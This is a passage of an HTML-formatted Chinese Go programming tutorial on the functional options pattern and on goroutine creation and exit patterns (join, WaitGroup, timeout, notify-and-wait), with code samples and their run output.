class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">WithOption2</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在这个例子中，<code>Options</code>结构体定义了需要配置的选项，<code>Option</code>是一个函数类型，用于修改这些选项。<code>WithOption1</code>和<code>WithOption2</code>是两个选项函数，分别用于设置<code>Option1</code>和<code>Option2</code>。<code>ProcessOptions</code>函数是主要函数，接受一个或多个选项参数，并根据这些选项进行操作。</p>\n<p>通过使用功能选项模式，可以灵活地向函数传递各种不同的配置选项，并根据需要调整函数的行为。这种模式在Go语言中经常用于简化函数接口，提高代码的可读性和可维护性。</p>\n<h2>1.7. Go常见的并发模式</h2>\n<p>在语言层面，Go针对CSP模型提供了三种并发原语。</p>\n<ul>\n<li>goroutine：对应CSP模型中的P，封装了数据的处理逻辑，是Go运行时调度的基本执行单元。</li>\n<li>channel：对应CSP模型中的输入/输出原语，用于goroutine之间的通信和同步。</li>\n<li>select：用于应对多路输入/输出，可以让goroutine同时协调处理多个channel操作。</li>\n</ul>\n<h3>创建模式</h3>\n<p>Go语言使用go关键字+函数/方法创建goroutine：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">go</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I am a goroutine\"</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\">// $GOROOT/src/net/http/server.go</span>\nc <span class=\"token operator\">:=</span> srv<span class=\"token punctuation\">.</span><span class=\"token function\">newConn</span><span class=\"token punctuation\">(</span>rw<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">go</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">serve</span><span class=\"token punctuation\">(</span>connCtx<span class=\"token punctuation\">)</span>\n</code></pre></div><p>但在稍复杂一些的并发程序中，需要考虑通过CSP模型输入/输出原语的承载体channel，在goroutine之间建立联系。为了满足这一需求，我们通常使用下面的方式来创建goroutine：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> T <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span><span class=\"token operator\">...</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">chan</span> T <span class=\"token punctuation\">{</span>\n    c <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> T<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 使用channel变量c(通过闭包方式)与调用spawn的goroutine通信</span>\n        <span class=\"token operator\">...</span>\n        <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">...</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> c\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    c <span class=\"token operator\">:=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 使用channel变量c与新创建的goroutine通信</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>以上方式在内部创建一个goroutine并返回一个channel类型变量的函数，这是Go中最常见的goroutine创建模式。</p>\n<p>spawn函数创建的新goroutine与调用spawn函数的goroutine之间通过一个channel建立起了联系：两个goroutine可以通过这个channel进行通信。spawn函数的实现得益于channel作为Go语言一等公民（first-class citizen）的存在：channel可以像变量一样被初始化、传递和赋值。上面例子中的spawn只返回了一个channel变量，大家可以根据需要自行定义返回的channel个数和用途。</p>\n<h3>退出模式</h3>\n<p>goroutine的使用代价很低，Go官方推荐多使用goroutine。在多数情况下，我们无须考虑对goroutine的退出进行控制：goroutine的执行函数返回，即意味着goroutine退出。但一些常驻的后台服务程序可能会对goroutine有着优雅退出的要求，在这里我们就分类说明一下goroutine的几种退出模式。</p>\n<h4>（1）分离模式</h4>\n<p>这里借鉴了一些线程模型中的术语，比如分离（detached）模式。分离模式是使用最为广泛的goroutine退出模式。对于分离的goroutine，创建它的goroutine不需要关心它的退出，这类goroutine在启动后即与其创建者彻底分离，其生命周期与其执行的主函数相关，函数返回即goroutine退出。这类goroutine有两个常见用途。</p>\n<p>1）一次性任务：顾名思义，新创建的goroutine用来执行一个简单的任务，执行后即退出。</p>\n<p>2）常驻后台执行一些特定任务，如监视（monitor）、观察（watch）等。其实现通常采用<code>for {...}</code>或<code>for { select{...} }</code>代码段形式，并多以定时器（timer）或事件（event）驱动执行。</p>\n<h4>（2）join模式</h4>\n<p>在线程模型中，父线程可以通过<code>pthread_join</code>来等待子线程结束并获取子线程的结束状态。在Go中，我们有时候也有类似的需求：goroutine的创建者需要等待新goroutine结束。笔者为这样的goroutine退出模式起名为“join模式”。</p>\n<p>① 等待一个goroutine退出</p>\n<p>我们从一个简单的场景开始，先来看看如何等待一个goroutine结束。下面是模拟该场景的一段示例代码：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-1.go</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">worker</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span>\n    interval<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span>\n    \n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Duration</span><span class=\"token punctuation\">(</span>interval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">{</span>\n    c <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>args<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n        c <span class=\"token operator\">&lt;-</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     done <span class=\"token operator\">:=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>worker<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n     <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn a worker goroutine\"</span><span class=\"token punctuation\">)</span>\n     <span class=\"token operator\">&lt;-</span>done\n     <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"worker done\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上面的代码中，spawn函数使用典型的goroutine创建模式创建了一个goroutine，main goroutine作为创建者通过spawn函数返回的channel与新goroutine建立联系，这个channel的用途就是在两个goroutine之间建立退出事件的“信号”通信机制。main goroutine在创建完新goroutine后便在该channel上阻塞等待，直到新goroutine退出前向该channel发送了一个信号。运行该示例：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>$ go run go-concurrency-pattern-1.go\nspawn a worker goroutine\nworker <span class=\"token keyword\">done</span>\n</code></pre></div><p>② 获取goroutine的退出状态</p>\n<p>如果新goroutine的创建者不仅要等待goroutine的退出，还要精准获取其结束状态，同样可以通过自定义类型的channel来实现这一场景需求。下面是基于上面的代码改造后的示例：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-2.go</span>\n\n<span class=\"token keyword\">var</span> OK <span class=\"token operator\">=</span> errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ok\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">worker</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invalid args\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    interval<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invalid interval arg\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    \n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Duration</span><span class=\"token punctuation\">(</span>interval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> OK\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">,</span> args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">chan</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">{</span>\n    c <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        c <span class=\"token operator\">&lt;-</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>args<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    done <span class=\"token operator\">:=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>worker<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn worker1\"</span><span class=\"token punctuation\">)</span>\n    err <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>done\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"worker1 done:\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n    done <span class=\"token operator\">=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>worker<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn worker2\"</span><span class=\"token punctuation\">)</span>\n    err <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>done\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"worker2 done:\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>我们将channel中承载的类型由<code>struct{}</code>改为了error，这样channel承载的信息就不只是一个信号了，还携带了有价值的信息：新goroutine的结束状态。运行上述示例：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token variable\">$go</span> run go-concurrency-pattern-2.go\nspawn worker1\nworker1 done: ok\nspawn worker2\nworker2 done: invalid args\n</code></pre></div><p>③ 等待多个goroutine退出</p>\n<p>在有些场景中，goroutine的创建者可能会创建不止一个goroutine，并且需要等待全部新goroutine退出。可以通过Go语言提供的<code>sync.WaitGroup</code>实现等待多个goroutine退出的模式：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-3.go</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">worker</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span>\n    \n    interval<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span>\n    \n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Duration</span><span class=\"token punctuation\">(</span>interval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawnGroup</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">{</span>\n    c <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">var</span> wg sync<span class=\"token punctuation\">.</span>WaitGroup\n    \n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n        wg<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>i <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            name <span class=\"token operator\">:=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"worker-%d:\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n            <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>args<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"done\"</span><span class=\"token punctuation\">)</span>\n            wg<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// worker done!</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        wg<span class=\"token punctuation\">.</span><span class=\"token function\">Wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        c <span class=\"token operator\">&lt;-</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> c\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    done <span class=\"token operator\">:=</span> <span class=\"token function\">spawnGroup</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> worker<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn a group of workers\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token operator\">&lt;-</span>done\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"group workers done\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>我们看到，通过<code>sync.WaitGroup</code>，<code>spawnGroup</code>每创建一个goroutine都会调用<code>wg.Add(1)</code>，新创建的goroutine会在退出前调用<code>wg.Done</code>。在<code>spawnGroup</code>中还创建了一个用于监视的goroutine，该goroutine调用<code>sync.WaitGroup</code>的Wait方法来等待所有goroutine退出。在所有新创建的goroutine退出后，Wait方法返回，该监视goroutine会向<code>done</code>这个channel写入一个信号，这时<code>main</code> goroutine才会从阻塞在<code>done</code> channel上的状态中恢复，继续往下执行。</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token variable\">$go</span> run go-concurrency-pattern-3.go \nspawn a group of workers\nworker-2: <span class=\"token keyword\">done</span>\nworker-1: <span class=\"token keyword\">done</span>\nworker-0: <span class=\"token keyword\">done</span>\nworker-4: <span class=\"token keyword\">done</span>\nworker-3: <span class=\"token keyword\">done</span>\ngroup workers <span class=\"token keyword\">done</span>\n</code></pre></div><p>④ 支持超时机制的等待</p>\n<p>有时候，我们不想无限阻塞等待所有新创建goroutine的退出，而是仅等待一段合理的时间。如果在这段时间内goroutine没有退出，则创建者会继续向下执行或主动退出。下面的示例代码在等待多个goroutine退出的例子之上增加了超时机制：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-4.go</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    done <span class=\"token operator\">:=</span> <span class=\"token function\">spawnGroup</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> worker<span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn a group of workers\"</span><span class=\"token punctuation\">)</span>\n    \n    timer <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">NewTimer</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">defer</span> timer<span class=\"token punctuation\">.</span><span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>timer<span class=\"token punctuation\">.</span>C<span class=\"token punctuation\">:</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wait group workers exit timeout!\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"group workers done\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上述代码中，我们通过一个定时器（<code>time.Timer</code>）设置了超时等待时间，并通过select原语同时监听<code>timer.C</code>和<code>done</code>这两个channel，哪个先返回数据就执行哪个case分支。</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>$ go run go-concurrency-pattern-4.go\nspawn a group of workers\n<span class=\"token function\">wait</span> group workers <span class=\"token builtin class-name\">exit</span> timeout<span class=\"token operator\">!</span>\n</code></pre></div><h4>（3）notify-and-wait模式</h4>\n<p>在前面的几个场景中，goroutine的创建者都是在被动地等待着新goroutine的退出。但很多时候，goroutine创建者需要主动通知那些新goroutine退出，尤其是当main goroutine作为创建者时。main goroutine退出意味着Go程序的终止，而粗暴地直接让main goroutine退出的方式可能会导致业务数据损坏、不完整或丢失。我们可以通过notify-and-wait（通知并等待）模式来满足这一场景的要求。虽然这一模式也不能完全避免损失，但是它给了各个goroutine一个挽救数据的机会，从而尽可能减少损失。</p>\n<p>① 通知并等待一个goroutine退出</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-5.go</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">worker</span><span class=\"token punctuation\">(</span>j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Duration</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n    quit <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> job <span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span> <span class=\"token comment\">// 模拟job channel</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">case</span> j <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>job<span class=\"token punctuation\">:</span>\n                <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>quit<span class=\"token punctuation\">:</span>\n                quit <span class=\"token operator\">&lt;-</span> <span class=\"token string\">\"ok\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> quit\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    quit <span class=\"token operator\">:=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>worker<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn a worker goroutine\"</span><span class=\"token punctuation\">)</span>\n    \n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Second<span class=\"token 